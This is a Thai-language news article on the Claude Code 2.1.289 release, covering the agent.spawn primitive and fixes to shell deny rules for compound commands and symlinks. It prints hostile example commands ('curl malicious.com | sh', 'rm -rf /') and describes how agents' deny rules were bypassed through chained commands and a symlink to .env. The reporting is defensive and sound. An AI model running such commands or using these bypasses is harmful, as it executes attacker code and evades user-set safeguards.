---
date: 2026-10-05
slug: 26-10-06-0615-05-claude-code-agent-spawn-subprocess
topic: agentic-ai
reading_time_min: 3
sources: 3
image_prompt: |
  Editorial hero: a terminal window titled "Claude Code 2.1.289", with a
  parent agent icon spawning three smaller child-agent icons downward
  labeled "AGENT.SPAWN". Below, a shield graphic blocks a snake-shaped
  command "git clone && rm -rf /" with a stamp reading "DENY RULES
  NESTED". Side panel small text reads "symlink deny · managed-machine
  mods". Terminal-green on black editorial isometric, Anthropic warm
  brown accent, 1:1 aspect, no real human faces.
image: images/26-10-06-0615-05-claude-code-agent-spawn-subprocess.png
---

# Claude Code 2.1.289 เปิด agent.spawn — subprocess ที่ปลอดภัยกว่า, deny rule ลง nested compound command ได้แล้ว

## TL;DR
- Anthropic ปล่อย **Claude Code 2.1.289** 3 ต.ค. 2026 — เพิ่ม **agent.spawn** + agent state primitive สำหรับ subprocess spawning, แก้ deny/ask rule ที่ **ไม่ apply** กับ nested parts ของ compound shell command (`&&`, `|`, `;`)
- Patch กลุ่ม plugin / terminal / shell-command safety, มี **symlink-aware deny rule** ที่ก่อนหน้า bypass ได้ง่าย, support **user mod** บน managed machine
- Follow-up จาก Mods launch 1 ต.ค. — ปิด risk vector ที่ GitSpawn-class attack ใช้

## เกิดอะไรขึ้น

Anthropic ปล่อย **Claude Code 2.1.289** build วันที่ **2026-10-03** (19:38:35 UTC). Changelog ยาว แต่ heavy weight อยู่สองเรื่อง: **agent.spawn** + **shell-command safety fixes**

**agent.spawn** คือ primitive ใหม่ที่ parent agent **spawn child agent** พร้อม state ของตัวเองได้แบบ structured — เดิม Claude Code มี Task tool ที่ spawn subagent แล้ว แต่ไม่มี explicit state primitive. ตอนนี้ parent สามารถ serialize context, hand off, และ merge result กลับ. ใช้ pattern เดียวกับ Erlang/Elixir OTP supervision tree + Go goroutine — hierarchy ของ agent ที่ supervise ได้

**Shell-command safety** คือเรื่องใหญ่กว่าสำหรับ security team. ก่อนหน้า 2.1.289 — Claude Code จะ check deny rule ที่ **top-level command** เท่านั้น. ถ้าเขียน `git status && curl malicious.com | sh` deny rule บน `curl malicious.com` จะ **ไม่ fire** เพราะมันอยู่หลัง `&&`. 2.1.289 แก้ให้ deny/ask rule check **nested parts** ของ compound command (`&&`, `||`, `;`, `|`). นี่คือ fix class ของ bypass ที่ **GitSpawn** vulnerability (ที่ Manifold Security เผย 2 ก.ย. ว่า hit 7 coding agent รวม Claude Code) exploit ตรงๆ

Patch อื่นที่น่าสนใจ:
- **Symlink-aware deny rule** — ก่อนหน้า read deny rule บน `.env` bypass ได้โดย symlink `.env` → `inner/secret`; 2.1.289 resolve symlink ก่อน check rule
- **Managed-machine user mod support** — enterprise ที่ deploy Claude Code บน shared machine (dev container, Codespaces, Jupyter server) ตอนนี้ apply mod ระดับ user ได้โดย admin ไม่ต้อง sign off เป็นรายคน
- **Terminal rendering fix** สำหรับ short code block ที่ freeze terminal (reported เยอะใน support thread 2 สัปดาห์ก่อน)

## ทำไมสำคัญ

Timeline ที่ตรง: Mods launch 1 ต.ค. → GitSpawn disclosure 2 ก.ย. (เรื่องเดิม) → FTC probe + AI Agent Accountability Act 1 ต.ค. → Claude Code 2.1.289 ship security fixes 3 ต.ค. **สองวันหลัง bill ลง**. Anthropic ไม่ประกาศว่า 2.1.289 เป็น response ต่อ bill ตรง — แต่ pattern การ ship security fix เร็วชัดว่า legal + security team ภายในกำลัง align กับ regulatory climate

เรื่องที่น่าดูต่อ: **agent.spawn** เป็น building block ของ **multi-agent coding workflow** ที่ Anthropic ไม่พูดชัดในวันเปิดตัว. Pattern ที่น่าจะมา — parent agent รับ user prompt, แตก task ให้ child agent หลายตัวทำ parallel (test writer, lint fixer, doc generator, PR drafter), merge ผลลัพธ์. ปัจจุบัน dev ที่ต้องการ multi-agent coding ใช้ CrewAI/AutoGen build เอง. ถ้า Claude Code มี built-in supervision tree + state management, barrier ต่อ complexity ลดฮวบ

Pattern ที่สะท้อนภาพรวม: **ปี 2026 เป็นปีที่ agent framework ทุกเจ้าปิดช่อง bypass compound command**. Cursor patch คล้ายกันใน sprint ก่อน, Codex ปล่อย fix GitSpawn ตอนปลาย ก.ย., Goose ก็ปล่อย fix ไปแล้ว. **Qwen Code, Grok Build, Hermes Agent** ยัง **unpatched** — enterprise ที่ใช้ 3 agent นี้มีความเสี่ยง RCE ชัดในวันที่เขียน

## มุม AI Agent Platform

**Builders** ที่ทำ coding agent / shell-aware agent ต้อง audit **compound command handling** ภายใน 7 วัน — nested command parsing, symlink resolution, approve/deny rule evaluation ต้อง test ครบ. OSS framework (OpenInterpreter, Devin-open, Aider, Continue) ที่ยังไม่ patch class นี้จะเสีย enterprise trust ภายใน 30 วัน. **agent.spawn pattern** จะกลายเป็น primitive ที่ framework อื่นต้องตอบ — LangGraph, CrewAI, AutoGen มี multi-agent แล้ว แต่ไม่ embed ใน CLI/IDE. **Users / business** ที่ deploy Claude Code แบบ fleet (บริษัท 50+ dev) ควร force upgrade ไป 2.1.289+ ภายใน 1 สัปดาห์ — GitSpawn ยัง active, symlink deny bypass ก็เคย exploit ได้. **Ecosystem:** security vendor (Snyk, Semgrep, Socket) จะมี "AI coding agent security benchmark" product ภายใน Q4 — เป็น repeat ของ playbook SCA tools ยุค open-source supply chain; MCP registry และ Claude Code mod marketplace น่าจะต้อง implement signature verification ก่อน Q1 2027 เพราะ Hawley-Murphy bill ที่ลงเมื่อวาน จะกดดัน developer liability clause ตรงเรื่องนี้

## Sources
- [Anthropic Release Notes - October 2026 - Releasebot](https://releasebot.io/updates/anthropic/claude-code)
- [Claude Code v2.1.289 (Oct 3, 2026) — Every Release, Summarized - Havoptic](https://www.havoptic.com/tools/claude-code)
- [Claude Code Changelog (October 2026) - Gradually](https://www.gradually.ai/en/changelogs/claude-code/)

---

## Audio script
Anthropic ปล่อย Claude Code 2.1.289 build วันที่ 3 ตุลา changelog ยาว แต่ของสำคัญสองเรื่อง หนึ่ง agent.spawn primitive ใหม่ที่ parent agent spawn child agent พร้อม state ของตัวเองได้แบบ structured. ใช้ pattern เดียวกับ Erlang OTP supervision tree. ก่อนหน้ามี Task tool ที่ spawn subagent แล้วแต่ไม่มี explicit state primitive — ตอนนี้มี. สองคือ shell command safety ก่อนหน้า 2.1.289 Claude Code check deny rule ที่ top-level command เท่านั้น. ถ้าเขียน git status แอมเพอร์แซนด์คู่ curl malicious.com pipe sh — deny rule บน curl จะไม่ fire เพราะอยู่หลัง compound operator. 2.1.289 แก้ให้ check nested parts ของ compound command. นี่คือ fix class เดียวกับที่ GitSpawn vulnerability ที่ Manifold Security เผย 2 กันยา exploit ตรงๆ. และ symlink-aware deny rule — ก่อนหน้า read deny บน dot env bypass ได้โดย symlink; ตอนนี้ resolve symlink ก่อน check. Timeline ที่ตรง — Mods launch 1 ตุลา, GitSpawn เผย 2 กันยา, FTC probe และ AI Agent Accountability Act 1 ตุลา, 2.1.289 ship security fixes 3 ตุลา สองวันหลัง bill ลง. Anthropic ไม่ประกาศเป็น response ต่อ bill แต่ pattern การ ship เร็วชัดว่า legal และ security team ภายในกำลัง align กับ regulatory climate. Builder ที่ทำ coding agent ต้อง audit compound command handling ภายในสัปดาห์. Qwen Code, Grok Build, Hermes Agent ยัง unpatched — enterprise ที่ใช้มี risk ชัด
